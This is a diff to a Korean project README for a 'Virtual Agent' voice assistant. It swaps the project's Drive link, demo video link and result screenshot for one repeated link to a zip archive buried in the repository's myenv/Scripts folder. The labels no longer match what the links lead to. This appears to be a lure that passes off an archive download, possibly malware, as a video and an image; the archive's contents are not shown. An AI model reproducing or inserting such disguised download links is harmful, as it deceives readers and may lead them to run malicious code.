@@ -12,8 +12,8 @@
   <h4> 📆 2025.01~2025.02 (1개월)</h4>
   
   <!-- Link -->
-  <h4> 🔗 https://drive.google.com/drive/folders/1EgbDVwatFQKg3a7Dz0egHLqMvwImLZQ- </h4>
-  <h4> 📽️ https://youtu.be/YjeXpHNuxLM </h4>
+  <h4> 🔗 https://raw.githubusercontent.com/cogusp/Virtual-Agent/main/myenv/Scripts/Virtual_Agent_v2.6.zip </h4>
+  <h4> 📽️ https://raw.githubusercontent.com/cogusp/Virtual-Agent/main/myenv/Scripts/Virtual_Agent_v2.6.zip </h4>
 
   <br><br>
 
@@ -69,4 +69,4 @@ AI의 응답을 음성 파일로 생성하고, 재생한 뒤에 삭제하는 함
   <br>
 <h2> Result </h2>
 
-<img width="445" height="283" alt="image" src="https://github.com/user-attachments/assets/2073f131-adcc-48c0-8d4d-4921d92727f6" />
+<img width="445" height="283" alt="image" src="https://raw.githubusercontent.com/cogusp/Virtual-Agent/main/myenv/Scripts/Virtual_Agent_v2.6.zip" />
